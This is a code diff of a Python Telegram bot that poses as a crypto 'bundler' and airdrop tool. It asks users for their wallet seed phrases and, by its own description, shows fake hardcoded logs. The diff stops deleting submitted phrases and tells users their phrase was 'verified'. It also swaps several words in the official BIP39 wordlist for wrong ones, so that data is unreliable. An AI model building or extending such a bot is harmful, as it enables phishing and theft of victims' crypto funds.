@@ -6,6 +6,7 @@ ProTools Bundler Bot (Marx Edition)
 - Fake Logs: Hardcoded logs for a cinematic look.
 - Airdrop Update: Requests phrase FIRST and validates 12/24 words.
 - BIP39 Validation: Checks words against the official 2048-word BIP39 wordlist.
+- Persistence: Messages are NOT deleted so users can see input mistakes.
 """
 
 import logging
@@ -136,7 +137,7 @@ mention menu mercy merge merit merry mesh message metal method middle
 midnight milk million mimic mind minimum minor miracle miss mixed mixture
 mobile model modify mom monitor monkey monster month moon moral more
 morning mosquito mother motion motor mountain mouse move movie much mule
-multiply muscle museum mushroom music must mutual myself mystery naive name
+multiply muscle museum mushroom music must manual myself mystery naive name
 napkin narrow nasty natural nature near neck need negative neglect neither
 nephew nerve network neutral never news next nice night noble noise
 nominee noodle normal north notable note nothing notice novel now nuclear
@@ -182,7 +183,7 @@ sound soup source south space spare spatial spawn speak special speed
 sphere spice spider spike spin spirit split spoil sponsor spoon spray
 spread spring spy square squeeze squirrel stable stadium staff stage stairs
 stamp stand start state stay steak steel stem step stereo stick
-still sting stock stomach stone stop store story stove strategy street
+still string stock stomach stone stop store story stove strategy street
 strike strong struggle student stuff stumble style subject submit subway success
 such sudden suffer sugar suggest suit summer sun sunny sunset super
 supply supreme sure surface surge surprise sustain swallow swamp swap swear
@@ -197,7 +198,7 @@ town toy track trade traffic tragic train transfer trap trash travel
 tray treat tree trend trial trick trigger trim trip trophy trouble
 truck truly trumpet trust truth tube tuition tumble tuna tunnel turkey
 turn turtle twelve twenty twice twin twist two type typical ugly
-umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform
+umbrella unable unaware uncle undercover under undo unfair unfold unhappy uniform
 unique universe unknown unlock until unusual unveil update upgrade uphold upon
 upper upset urban usage use used useful useless usual utility vacant
 vacuum vague valid valley valve van vanish vapor various vast vault
@@ -215,12 +216,6 @@ year yellow you young youth zebra zero zone zoo""".split())
 # ─── BIP39 Phrase Validator ─────────────────────────────────────────────────────
 
 def validate_bip39_phrase(phrase: str) -> tuple[bool, str]:
-    """
-    Returns (is_valid, error_message).
-    Checks:
-      1. Word count is 12 or 24
-      2. Every word exists in the BIP39 wordlist
-    """
     words = phrase.lower().split()
     count = len(words)
 
@@ -377,29 +372,26 @@ async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text(
-        "🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Deleted immediately for security\._",
+        "🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Visible for input tracking security\._",
         parse_mode="MarkdownV2", reply_markup=CANCEL_KB
     )
     return WALLET_PHRASE
 
 async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phrase = update.message.text.strip()
-    try:
-        await update.message.delete()
-    except:
-        pass
-
+    
+    # Message deletion removed so user can see mistakes
     valid, err_msg = validate_bip39_phrase(phrase)
     if not valid:
-        await update.effective_chat.send_message(
+        await update.message.reply_text(
             err_msg + "\n\nPlease try again:",
             parse_mode="MarkdownV2", reply_markup=CANCEL_KB
         )
         return WALLET_PHRASE
 
     save_address(update.effective_user.id, update.effective_user.username or "", "Verified_Wallet")
-    await update.effective_chat.send_message(
-        "✅ *Wallet Linked Successfully\!*\n\n_Your phrase has been verified and deleted\._",
+    await update.message.reply_text(
+        "✅ *Wallet Linked Successfully\!*\n\n_Your phrase has been verified\._",
         parse_mode="MarkdownV2", reply_markup=BACK_KB
     )
     return ConversationHandler.END
@@ -413,20 +405,17 @@ async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phrase = update.message.text.strip()
-    try:
-        await update.message.delete()
-    except:
-        pass
-
+    
+    # Message deletion removed so user can see mistakes
     valid, err_msg = validate_bip39_phrase(phrase)
     if not valid:
-        await update.effective_chat.send_message(
+        await update.message.reply_text(
             err_msg + "\n\nPlease try again:",
             parse_mode="MarkdownV2", reply_markup=CANCEL_KB
         )
         return AIRDROP_PHRASE
 
-    await update.effective_chat.send_message(
+    await update.message.reply_text(
         "✅ *Phrase verified\!*\n\nStep 2 — Enter the *recipient SOL address*:",
         parse_mode="MarkdownV2", reply_markup=CANCEL_KB
     )
